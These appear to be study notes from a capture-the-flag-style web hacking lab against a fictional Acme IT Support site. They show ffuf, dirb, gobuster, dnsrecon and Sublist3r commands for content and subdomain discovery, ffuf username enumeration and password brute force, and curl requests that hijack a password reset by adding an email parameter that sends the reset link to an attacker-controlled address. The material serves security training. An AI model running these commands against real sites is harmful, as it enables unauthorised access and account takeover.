### Wappalyzer

Wappalyzer (https://www.wappalyzer.com/) is an online tool and browser extension that helps identify what technologies a website uses, such as frameworks, Content Management Systems (CMS), payment processors and much more, and it can even find version numbers as well.


### Automation Tools

Although there are many different content discovery tools available, all with their features and flaws, we're going to cover three which are preinstalled on our attack box, ffuf, dirb and gobuster.


Using ffuf:
```console
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.199.0/FUZZ
```


Using dirb:
```console
dirb http://10.10.199.0/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

Using Gobuster:
```console
gobuster dir --url http://10.10.199.0/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

## Subdomain Enumeration
### SSL/TLS Certificates
When an SSL/TLS (Secure Sockets Layer/Transport Layer Security) certificate is created for a domain by a CA (Certificate Authority), CA's take part in what's called "Certificate Transparency (CT) logs". These are publicly accessible logs of every SSL/TLS certificate created for a domain name. The purpose of Certificate Transparency logs is to stop malicious and accidentally made certificates from being used. We can use this service to our advantage to discover subdomains belonging to a domain, sites like https://crt.sh and https://ui.ctsearch.entrust.com/ui/ctsearchui offer a searchable database of certificates that shows current and historical results.


### Bruteforce DNS
Bruteforce DNS (Domain Name System) enumeration is the method of trying tens, hundreds, thousands or even millions of different possible subdomains from a pre-defined list of commonly used subdomains. Because this method requires many requests, we automate it with tools to make the process quicker. In this instance, we are using a tool called dnsrecon to perform this.
Tools: [dnsrecon](https://www.kali.org/tools/dnsrecon/)
```console
dnsrecon -t brt -d acmeitsupport.thm
```

### OSINT subdomain discovery
To speed up the process of OSINT subdomain discovery, we can automate the above methods with the help of tools like [Sublist3r](https://github.com/aboul3la/Sublist3r)

```console
./sublist3r.py -d acmeitsupport.thm
```

### Virtual Hosts
Some subdomains aren't always hosted in publically accessible DNS results, such as development versions of a web application or administration portals. Instead, the DNS record could be kept on a private DNS server or recorded on the developer's machines in their /etc/hosts file (or c:\windows\system32\drivers\etc\hosts file for Windows users) which maps domain names to IP addresses. 

Because web servers can host multiple websites from one server when a website is requested from a client, the server knows which website the client wants from the Host header. We can utilise this host header by making changes to it and monitoring the response to see if we've discovered a new website.

Like with DNS Bruteforce, we can automate this process by using a wordlist of commonly used subdomains.

```console
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.137.225
```

The above command uses the `-w` switch to specify the wordlist we are going to use. The `-H` switch adds/edits a header (in this instance, the Host header), we have the `FUZZ` keyword in the space where a subdomain would normally go, and this is where we will try all the options from the wordlist.

Because the above command will always produce a valid result, we need to filter the output. We can do this by using the page size result with the `-f`s switch. Edit the below command replacing `{size}` with the most occurring size value from the previous result and try it on the AttackBox.

```console
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.137.225 -fs {size}
```

This command has a similar syntax to the first apart from the `-fs` switch, which tells ffuf to ignore any results that are of the specified size.


## Authentication Bypass
### Username Enumeration
Website error messages are great resources for collating this information to build our list of valid usernames. We have a form to create a new user account if we go to the Acme IT Support website (http://10.10.180.182/customers/signup) signup page.



If you try entering the username admin and fill in the other form fields with fake information, you'll see we get the error An account with this username already exists. We can use the existence of this error message to produce a list of valid usernames already signed up on the system by using the ffuf tool below. The `ffuf` tool uses a list of commonly used usernames to check against for any matches.



Username enumeration with ffuf:
```console
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.180.182/customers/signup -mr "username already exists"
```

In the above example, the `-w` argument selects the file's location on the computer that contains the list of usernames that we're going to check exists. The `-X` argument specifies the request method, this will be a `GET` request by default, but it is a `POST` request in our example. The `-d` argument specifies the data that we are going to send. In our example, we have the fields username, email, password and cpassword. We've set the value of the username to `FUZZ`. In the `ffuf` tool, the `FUZZ` keyword signifies where the contents from our wordlist will be inserted in the request. The `-H` argument is used for adding additional headers to the request. In this instance, we're setting the Content-Type so the web server knows we are sending form data. The `-u` argument specifies the URL we are making the request to, and finally, the `-mr` argument is the text on the page we are looking for to validate we've found a valid username.

The ffuf tool and wordlist come pre-installed on the AttackBox or can be installed locally by downloading it from https://github.com/ffuf/ffuf.


### Brute Force
Using the valid_usernames.txt file we generated in the previous task, we can now use this to attempt a brute force attack on the login page (http://10.10.180.182/customers/login).

Note: If you created your valid_usernames file by piping the output from ffuf directly you may have difficulty with this task. Clean your data, or copy just the names into a new file.



A brute force attack is an automated process that tries a list of commonly used passwords against either a single username or, like in our case, a list of usernames.



When running this command, make sure the terminal is in the same directory as the `valid_usernames.txt` file.



Bruteforcing with ffuf:
```console
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.180.182/customers/login -fc 200
```

This `ffuf` command is a little different to the previous one in Task 2. Previously we used the `FUZZ` keyword to select where in the request the data from the wordlists would be inserted, but because we're using multiple wordlists, we have to specify our own `FUZZ` keyword. In this instance, we've chosen `W1` for our list of valid usernames and `W2` for the list of passwords we will try. The multiple wordlists are again specified with the `-w` argument but separated with a comma.  For a positive match, we're using the `-fc` argument to check for an HTTP status code other than 200.


### Logic Flaw

We're going to examine the Reset Password function of the Acme IT Support website (http://10.10.180.182/customers/reset). We see a form asking for the email address associated with the account on which we wish to perform the password reset. If an invalid email is entered, you'll receive the error message "Account not found from supplied email address".



For demonstration purposes, we'll use the email address `robert@acmeitsupport.thm` which is accepted. We're then presented with the next stage of the form, which asks for the username associated with this login email address. If we enter robert as the username and press the Check Username button, you'll be presented with a confirmation message that a password reset email will be sent to `robert@acmeitsupport.thm`.



At this stage, you may be wondering what the vulnerability could be in this application as you have to know both the email and username and then the password link is sent to the email address of the account owner.

This walkthrough will require running both of the below Curl Requests on the AttackBox which can be opened by using the Blue Button Above.

In the second step of the reset email process, the username is submitted in a POST field to the web server, and the email address is sent in the query string request as a `GET` field.

Let's illustrate this by using the curl tool to manually make the request to the webserver.

Curl Request 1:
```console
curl 'http://10.10.180.182/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
```
We use the `-H` flag to add an additional header to the request. In this instance, we are setting the `Content-Type` to `application/x-www-form-urlencoded`, which lets the web server know we are sending form data so it properly understands our request.
In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable `$_REQUEST`.

The PHP `$_REQUEST` variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and `POST` data, the application logic for this variable favours `POST` data fields rather than the query string, so if we add another parameter to the `POST` form, we can control where the password reset email gets delivered.

Curl Request 2:
```console
curl 'http://10.10.180.182/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```


For the next step, you'll need to create an account on the Acme IT support customer section, doing so gives you a unique email address that can be used to create support tickets. The email address is in the format of `{username}@customer.acmeitsupport.thm`

Now rerunning Curl Request 2 but with your `@acmeitsupport.thm` in the email field you'll have a ticket created on your account which contains a link to log you in as Robert. Using Robert's account, you can view their support tickets and reveal a flag.

Curl Request 2 (but using your @acmeitsupport.thm account):
```console
curl 'http://10.10.180.182/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
```



















